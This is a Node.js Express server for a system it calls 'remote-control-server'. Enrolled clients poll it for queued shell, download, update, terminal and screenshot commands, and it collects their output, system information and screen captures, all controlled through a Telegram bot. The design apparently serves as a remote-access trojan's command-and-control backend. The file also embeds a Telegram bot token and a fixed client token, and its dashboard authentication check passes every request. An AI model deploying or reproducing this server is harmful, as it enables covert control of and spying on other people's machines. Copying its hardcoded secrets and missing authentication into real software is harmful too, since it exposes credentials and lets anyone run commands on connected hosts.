const crypto = require("crypto");
const express = require("express");
const fs = require("fs");
const path = require("path");
const { createTelegramBot } = require("./telegram-bot");

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = process.env.HOST || "0.0.0.0";
const FIXED_TOKEN = "a9K2xP8mZ7QwL1vB";
const ONLINE_THRESHOLD_MS = 30 * 1000;
const DATA_DIR = path.join(__dirname, "data");
const LOGS_DIR = path.join(__dirname, "logs");
const SCREENSHOTS_DIR = path.join(DATA_DIR, "screenshots");
const STORAGE_PATH = path.join(DATA_DIR, "storage.json");
const LOG_PATH = path.join(LOGS_DIR, "server.log");
const PUBLIC_DIR = path.join(__dirname, "public");
const APP_VERSION = "1.0.5";
const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN ||
  "8500323208:AAH_ugbRhSS4Pz-339m9S6WEm9j1JsMthms";
const TELEGRAM_ALLOWED_CHAT_IDS = process.env.TELEGRAM_ALLOWED_CHAT_IDS || "";
const TELEGRAM_PUBLIC_BASE_URL =
  process.env.TELEGRAM_PUBLIC_BASE_URL ||
  process.env.APP_BASE_URL ||
  process.env.RENDER_EXTERNAL_URL ||
  "https://client-status-server.onrender.com";

app.use(express.json({ limit: "12mb" }));
app.use(express.static(PUBLIC_DIR, { index: false }));
app.use("/screenshots", express.static(SCREENSHOTS_DIR, { index: false }));

function ensureDirectories() {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  fs.mkdirSync(SCREENSHOTS_DIR, { recursive: true });

  if (!fs.existsSync(STORAGE_PATH)) {
    const initialState = {
      clients: {},
      commands: {},
      reports: []
    };
    fs.writeFileSync(STORAGE_PATH, JSON.stringify(initialState, null, 2), "utf8");
  }
}

function normalizeOptionalText(value, maxLength = 300) {
  if (typeof value !== "string") {
    return "";
  }

  return value.trim().slice(0, maxLength);
}

function normalizeSystemInfo(value) {
  if (!value || typeof value !== "object" || Array.isArray(value)) {
    return null;
  }

  const normalized = {};
  for (const [key, entry] of Object.entries(value)) {
    if (typeof entry === "string") {
      const cleanKey = normalizeOptionalText(key, 100);
      const cleanValue = normalizeOptionalText(entry, 300);
      if (cleanKey && cleanValue) {
        normalized[cleanKey] = cleanValue;
      }
    }
  }

  return normalized;
}

function normalizeCommandEntry(entry) {
  if (typeof entry === "string") {
    const command = normalizeOptionalText(entry, 4096);
    if (!command) {
      return null;
    }

    return {
      command_id: crypto.randomUUID(),
      command,
      created_at: new Date().toISOString(),
      command_kind: "manual",
      terminal_session_id: "",
      terminal_type: "",
      terminal_title: "",
      display_command: ""
    };
  }

  if (!entry || typeof entry !== "object" || Array.isArray(entry)) {
    return null;
  }

  const command = normalizeOptionalText(entry.command, 4096);
  if (!command) {
    return null;
  }

  return {
    command_id: normalizeOptionalText(entry.command_id, 120) || crypto.randomUUID(),
    command,
    created_at: normalizeOptionalText(entry.created_at, 120) || new Date().toISOString(),
    command_kind: normalizeOptionalText(entry.command_kind, 40) || "manual",
    terminal_session_id: normalizeOptionalText(entry.terminal_session_id, 120),
    terminal_type: normalizeOptionalText(entry.terminal_type, 40),
    terminal_title: normalizeOptionalText(entry.terminal_title, 120),
    display_command: normalizeOptionalText(entry.display_command, 1000)
  };
}

function normalizeReportEntry(entry) {
  if (!entry || typeof entry !== "object" || Array.isArray(entry)) {
    return null;
  }

  const clientId = normalizeOptionalText(entry.client_id, 120);
  const result = normalizeOptionalText(entry.result, 10000);

  if (!clientId || !result) {
    return null;
  }

  return {
    report_id: normalizeOptionalText(entry.report_id, 120) || crypto.randomUUID(),
    client_id: clientId,
    result,
    received_at: normalizeOptionalText(entry.received_at, 120) || new Date().toISOString(),
    command_id: normalizeOptionalText(entry.command_id, 120),
    command_kind: normalizeOptionalText(entry.command_kind, 40),
    terminal_session_id: normalizeOptionalText(entry.terminal_session_id, 120),
    terminal_type: normalizeOptionalText(entry.terminal_type, 40),
    terminal_title: normalizeOptionalText(entry.terminal_title, 120),
    display_command: normalizeOptionalText(entry.display_command, 1000),
    screenshot_path: normalizeOptionalText(entry.screenshot_path, 260),
    screenshot_mime_type: normalizeOptionalText(entry.screenshot_mime_type, 80)
  };
}

function getScreenshotUrl(report) {
  return report.screenshot_path ? `/screenshots/${encodeURIComponent(report.screenshot_path)}` : "";
}

function saveScreenshotDataUrl(dataUrl) {
  const match = /^data:(image\/[a-zA-Z0-9.+-]+);base64,([\s\S]+)$/.exec(String(dataUrl || "").trim());
  if (!match) {
    return null;
  }

  const mimeType = match[1].toLowerCase();
  const extension = mimeType.includes("png") ? "png" : mimeType.includes("jpeg") || mimeType.includes("jpg") ? "jpg" : "";
  if (!extension) {
    return null;
  }

  const buffer = Buffer.from(match[2], "base64");
  if (!buffer.length) {
    return null;
  }

  const filename = `${Date.now()}-${crypto.randomUUID()}.${extension}`;
  fs.writeFileSync(path.join(SCREENSHOTS_DIR, filename), buffer);
  return {
    filename,
    mime_type: mimeType
  };
}

function readStorage() {
  ensureDirectories();
  const rawStorage = JSON.parse(fs.readFileSync(STORAGE_PATH, "utf8"));
  const clients = rawStorage.clients && typeof rawStorage.clients === "object" ? rawStorage.clients : {};
  const commands = rawStorage.commands && typeof rawStorage.commands === "object" ? rawStorage.commands : {};
  const reports = Array.isArray(rawStorage.reports) ? rawStorage.reports : [];

  const normalizedCommands = Object.fromEntries(
    Object.entries(commands).map(([clientId, queue]) => [
      clientId,
      Array.isArray(queue) ? queue.map(normalizeCommandEntry).filter(Boolean) : []
    ])
  );

  return {
    clients,
    commands: normalizedCommands,
    reports: reports.map(normalizeReportEntry).filter(Boolean)
  };
}

function writeStorage(data) {
  fs.writeFileSync(STORAGE_PATH, JSON.stringify(data, null, 2), "utf8");
}

function logAction(action, details = {}) {
  ensureDirectories();
  const record = {
    timestamp: new Date().toISOString(),
    action,
    details
  };
  const line = JSON.stringify(record);
  fs.appendFileSync(LOG_PATH, `${line}\n`, "utf8");
  console.log(line);
}

function getToken(req) {
  if (req.method === "GET") {
    return req.query.token;
  }
  return req.body?.token;
}

function normalizeClientId(value) {
  return typeof value === "string" ? value.trim() : "";
}

function clientAuthMiddleware(req, res, next) {
  const token = getToken(req);

  if (token !== FIXED_TOKEN) {
    logAction("auth_failed", {
      method: req.method,
      path: req.path,
      ip: req.ip
    });
    return res.status(401).json({ error: "Unauthorized" });
  }

  return next();
}

function dashboardAuthMiddleware(_req, _res, next) {
  return next();
}

function requireClientId(req, res, next) {
  const clientId = normalizeClientId(req.method === "GET" ? req.query.client_id : req.body?.client_id);

  if (!clientId) {
    return res.status(400).json({ error: "client_id is required" });
  }

  req.clientId = clientId;
  return next();
}

function requireTextField(fieldName, maxLength = 4096) {
  return (req, res, next) => {
    const value = req.body?.[fieldName];

    if (typeof value !== "string") {
      return res.status(400).json({ error: `${fieldName} must be a string` });
    }

    const trimmed = value.trim();
    if (!trimmed) {
      return res.status(400).json({ error: `${fieldName} cannot be empty` });
    }

    if (trimmed.length > maxLength) {
      return res.status(400).json({ error: `${fieldName} is too long` });
    }

    req[fieldName] = trimmed;
    return next();
  };
}

function isSupportedCommand(command) {
  return (
    command === "restart" ||
    command.startsWith("shell:") ||
    command.startsWith("download:") ||
    command.startsWith("update:") ||
    command.startsWith("terminal_exec:") ||
    command.startsWith("terminal_close:") ||
    command === "screenshot"
  );
}

function isClientOnline(client) {
  if (!client?.last_seen_at) {
    return false;
  }

  const lastSeenTimestamp = new Date(client.last_seen_at).getTime();
  return Date.now() - lastSeenTimestamp <= ONLINE_THRESHOLD_MS;
}

function getClientDisplayName(client) {
  return client.name || client.client_id;
}

function ensureClientDefaults(client) {
  return {
    ...client,
    name: client.name || "",
    archived: Boolean(client.archived),
    system_info: normalizeSystemInfo(client.system_info) || {}
  };
}

function upsertClient(storage, clientId, updates = {}) {
  const now = new Date().toISOString();
  const existing = ensureClientDefaults(storage.clients[clientId] || {
    client_id: clientId
  });

  storage.clients[clientId] = {
    client_id: clientId,
    name: existing.name || "",
    archived: Boolean(existing.archived),
    registered_at: existing.registered_at || now,
    last_seen_at: updates.last_seen_at || now,
    system_info: normalizeSystemInfo(updates.system_info) || existing.system_info || {}
  };

  storage.commands[clientId] = storage.commands[clientId] || [];
  return storage.clients[clientId];
}

function queueCommandForClient(storage, clientId, command, metadata = {}) {
  storage.commands[clientId] = storage.commands[clientId] || [];

  const commandEntry = normalizeCommandEntry({
    command_id: metadata.command_id || crypto.randomUUID(),
    command,
    created_at: new Date().toISOString(),
    command_kind: metadata.command_kind,
    terminal_session_id: metadata.terminal_session_id,
    terminal_type: metadata.terminal_type,
    terminal_title: metadata.terminal_title,
    display_command: metadata.display_command
  });

  storage.commands[clientId].push(commandEntry);
  return commandEntry;
}

function mutateStorage(mutator) {
  const storage = readStorage();
  const result = mutator(storage);
  writeStorage(storage);
  return result;
}

function requireStoredClient(storage, clientId) {
  const client = storage.clients[clientId];
  if (!client) {
    throw new Error("Client is not registered");
  }

  return client;
}

function queueDashboardCommand(clientId, command, metadata = {}, source = "telegram") {
  if (!isSupportedCommand(command)) {
    throw new Error("Unsupported command format");
  }

  const commandEntry = mutateStorage((storage) => {
    requireStoredClient(storage, clientId);
    return queueCommandForClient(storage, clientId, command, metadata);
  });

  logAction(`${source}_command_added`, {
    client_id: clientId,
    command_id: commandEntry.command_id,
    command_kind: commandEntry.command_kind,
    command_preview: command.slice(0, 120)
  });

  return commandEntry;
}

function renameStoredClient(clientId, name, source = "telegram") {
  const normalizedName = normalizeOptionalText(name, 120);
  if (!normalizedName) {
    throw new Error("Client name cannot be empty");
  }

  mutateStorage((storage) => {
    const client = requireStoredClient(storage, clientId);
    client.name = normalizedName;
  });

  logAction(`${source}_client_renamed`, {
    client_id: clientId,
    name: normalizedName
  });

  return normalizedName;
}

function setStoredClientArchived(clientId, archived, source = "telegram") {
  if (typeof archived !== "boolean") {
    throw new Error("archived must be a boolean");
  }

  mutateStorage((storage) => {
    const client = requireStoredClient(storage, clientId);
    client.archived = archived;
  });

  logAction(`${source}_client_archive_changed`, {
    client_id: clientId,
    archived
  });

  return archived;
}

function deleteStoredClient(clientId, source = "telegram") {
  mutateStorage((storage) => {
    requireStoredClient(storage, clientId);
    delete storage.clients[clientId];
    delete storage.commands[clientId];
    storage.reports = storage.reports.filter((report) => report.client_id !== clientId);
  });

  logAction(`${source}_client_deleted`, {
    client_id: clientId
  });

  return true;
}

function buildDashboardData(storage) {
  const clients = Object.values(storage.clients)
    .map((client) => {
      const normalizedClient = ensureClientDefaults(client);
      const queue = storage.commands[client.client_id] || [];
      const latestReport = [...storage.reports]
        .reverse()
        .find((report) => report.client_id === normalizedClient.client_id) || null;

      return {
        ...normalizedClient,
        display_name: getClientDisplayName(normalizedClient),
        is_online: isClientOnline(normalizedClient),
        pending_commands: queue.length,
        queued_commands: queue,
        latest_report: latestReport
          ? {
              ...latestReport,
              screenshot_url: getScreenshotUrl(latestReport)
            }
          : null
      };
    })
    .sort((left, right) => {
      const leftTime = new Date(left.last_seen_at || left.registered_at || 0).getTime();
      const rightTime = new Date(right.last_seen_at || right.registered_at || 0).getTime();
      return rightTime - leftTime;
    });

  const reports = [...storage.reports]
    .reverse()
    .slice(0, 50)
    .map((report) => {
      const client = ensureClientDefaults(storage.clients[report.client_id] || {
        client_id: report.client_id
      });

      return {
        ...report,
        display_name: getClientDisplayName(client),
        archived: Boolean(client.archived),
        screenshot_url: getScreenshotUrl(report)
      };
    });

  const activeClients = clients.filter((client) => !client.archived);
  const archivedClients = clients.filter((client) => client.archived);
  const onlineClients = clients.filter((client) => client.is_online);

  return {
    clients,
    reports,
    total_clients: clients.length,
    active_clients: activeClients.length,
    archived_clients: archivedClients.length,
    online_clients: onlineClients.length
  };
}

app.get("/health", (_req, res) => {
  res.json({
    version: APP_VERSION,
    service: "remote-control-server",
    status: "ok",
    telegram_bot_enabled: Boolean(TELEGRAM_BOT_TOKEN),
    endpoints: [
      "GET /",
      "GET /health",
      "POST /register",
      "GET /get-command",
      "POST /report",
      "POST /add-command",
      "POST /rename-client",
      "POST /archive-client",
      "POST /restart-client",
      "POST /delete-client",
      "GET /api/dashboard"
    ]
  });
});

app.get("/", (_req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

app.get("/dashboard", (_req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

app.post("/register", clientAuthMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  upsertClient(storage, req.clientId, {
    last_seen_at: new Date().toISOString(),
    system_info: req.body?.system_info
  });
  writeStorage(storage);

  logAction("client_registered", { client_id: req.clientId });
  res.json({ success: true, client_id: req.clientId });
});

app.get("/get-command", clientAuthMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  let client = storage.clients[req.clientId];

  if (!client) {
    client = upsertClient(storage, req.clientId, {
      last_seen_at: new Date().toISOString()
    });
    logAction("client_auto_restored", {
      client_id: req.clientId,
      source: "get-command"
    });
  }

  client.last_seen_at = new Date().toISOString();
  storage.commands[req.clientId] = storage.commands[req.clientId] || [];
  const commandEntry = storage.commands[req.clientId].shift() || null;
  writeStorage(storage);

  logAction("command_requested", {
    client_id: req.clientId,
    command_found: Boolean(commandEntry),
    command_id: commandEntry?.command_id || ""
  });

  return res.json({
    command: commandEntry ? commandEntry.command : null,
    command_id: commandEntry?.command_id || null,
    command_kind: commandEntry?.command_kind || null,
    terminal_session_id: commandEntry?.terminal_session_id || null,
    terminal_type: commandEntry?.terminal_type || null,
    terminal_title: commandEntry?.terminal_title || null,
    display_command: commandEntry?.display_command || null,
    created_at: commandEntry?.created_at || null
  });
});

app.post("/report", clientAuthMiddleware, requireClientId, requireTextField("result", 20000), (req, res) => {
  const storage = readStorage();
  let client = storage.clients[req.clientId];

  if (!client) {
    client = upsertClient(storage, req.clientId, {
      last_seen_at: new Date().toISOString()
    });
    logAction("client_auto_restored", {
      client_id: req.clientId,
      source: "report"
    });
  }

  client.last_seen_at = new Date().toISOString();

  const screenshotAsset = req.body?.screenshot_data_url
    ? saveScreenshotDataUrl(normalizeOptionalText(req.body?.screenshot_data_url, 11_000_000))
    : null;

  const reportEntry = normalizeReportEntry({
    report_id: crypto.randomUUID(),
    client_id: req.clientId,
    result: req.result,
    received_at: new Date().toISOString(),
    command_id: req.body?.command_id,
    command_kind: req.body?.command_kind,
    terminal_session_id: req.body?.terminal_session_id,
    terminal_type: req.body?.terminal_type,
    terminal_title: req.body?.terminal_title,
    display_command: req.body?.display_command,
    screenshot_path: screenshotAsset?.filename,
    screenshot_mime_type: screenshotAsset?.mime_type
  });

  storage.reports.push(reportEntry);
  writeStorage(storage);

  logAction("report_received", {
    client_id: req.clientId,
    report_id: reportEntry.report_id,
    command_id: reportEntry.command_id,
    result_preview: req.result.slice(0, 120)
  });

  return res.json({ success: true, report_id: reportEntry.report_id });
});

app.post(
  "/add-command",
  dashboardAuthMiddleware,
  requireClientId,
  requireTextField("command", 4096),
  (req, res) => {
    const storage = readStorage();
    const client = storage.clients[req.clientId];

    if (!client) {
      logAction("command_added_for_unknown_client", { client_id: req.clientId });
      return res.status(404).json({ error: "Client is not registered" });
    }

    if (!isSupportedCommand(req.command)) {
      logAction("command_rejected", {
        client_id: req.clientId,
        command_preview: req.command.slice(0, 120)
      });
      return res.status(400).json({
        error: "Unsupported command format. Use shell:, download:, update:, screenshot, terminal_exec:, or terminal_close:"
      });
    }

    const commandEntry = queueCommandForClient(storage, req.clientId, req.command, {
      command_kind: normalizeOptionalText(req.body?.command_kind, 40) || "manual",
      terminal_session_id: normalizeOptionalText(req.body?.terminal_session_id, 120),
      terminal_type: normalizeOptionalText(req.body?.terminal_type, 40),
      terminal_title: normalizeOptionalText(req.body?.terminal_title, 120),
      display_command: normalizeOptionalText(req.body?.display_command, 1000)
    });

    writeStorage(storage);

    logAction("command_added", {
      client_id: req.clientId,
      command_id: commandEntry.command_id,
      command_kind: commandEntry.command_kind,
      command_preview: req.command.slice(0, 120)
    });

    return res.json({
      success: true,
      queued: true,
      command_id: commandEntry.command_id
    });
  }
);

app.post("/rename-client", dashboardAuthMiddleware, requireClientId, requireTextField("name", 120), (req, res) => {
  const storage = readStorage();
  const client = storage.clients[req.clientId];

  if (!client) {
    return res.status(404).json({ error: "Client is not registered" });
  }

  client.name = req.name;
  writeStorage(storage);

  logAction("client_renamed", {
    client_id: req.clientId,
    name: req.name
  });

  return res.json({ success: true, name: req.name });
});

app.post("/archive-client", dashboardAuthMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  const client = storage.clients[req.clientId];

  if (!client) {
    return res.status(404).json({ error: "Client is not registered" });
  }

  if (typeof req.body?.archived !== "boolean") {
    return res.status(400).json({ error: "archived must be a boolean" });
  }

  client.archived = req.body.archived;
  writeStorage(storage);

  logAction("client_archive_changed", {
    client_id: req.clientId,
    archived: client.archived
  });

  return res.json({ success: true, archived: client.archived });
});

app.post("/restart-client", dashboardAuthMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  const client = storage.clients[req.clientId];

  if (!client) {
    return res.status(404).json({ error: "Client is not registered" });
  }

  queueCommandForClient(storage, req.clientId, "restart", {
    command_kind: "manual"
  });
  writeStorage(storage);

  logAction("client_restart_queued", {
    client_id: req.clientId
  });

  return res.json({ success: true, queued: true });
});

app.post("/delete-client", dashboardAuthMiddleware, requireClientId, (req, res) => {
  const storage = readStorage();
  const client = storage.clients[req.clientId];

  if (!client) {
    return res.status(404).json({ error: "Client is not registered" });
  }

  delete storage.clients[req.clientId];
  delete storage.commands[req.clientId];
  storage.reports = storage.reports.filter((report) => report.client_id !== req.clientId);
  writeStorage(storage);

  logAction("client_deleted", {
    client_id: req.clientId
  });

  return res.json({ success: true, deleted: true });
});

app.get("/api/dashboard", dashboardAuthMiddleware, (_req, res) => {
  const storage = readStorage();
  res.json(buildDashboardData(storage));
});

app.use((err, _req, res, _next) => {
  logAction("server_error", {
    message: err.message,
    stack: err.stack
  });
  res.status(500).json({ error: "Internal server error" });
});

const telegramBot = createTelegramBot({
  token: TELEGRAM_BOT_TOKEN,
  publicBaseUrl: TELEGRAM_PUBLIC_BASE_URL,
  allowedChatIds: TELEGRAM_ALLOWED_CHAT_IDS,
  appVersion: APP_VERSION,
  getDashboardData: () => buildDashboardData(readStorage()),
  queueCommand: (clientId, command, metadata) => queueDashboardCommand(clientId, command, metadata, "telegram"),
  renameClient: (clientId, name) => renameStoredClient(clientId, name, "telegram"),
  setClientArchived: (clientId, archived) => setStoredClientArchived(clientId, archived, "telegram"),
  deleteClient: (clientId) => deleteStoredClient(clientId, "telegram"),
  queueRestart: (clientId) =>
    queueDashboardCommand(
      clientId,
      "restart",
      {
        command_kind: "manual",
        display_command: "restart"
      },
      "telegram"
    ),
  logAction
});

ensureDirectories();
app.listen(PORT, HOST, () => {
  logAction("server_started", { host: HOST, port: PORT });
  telegramBot.start();
});
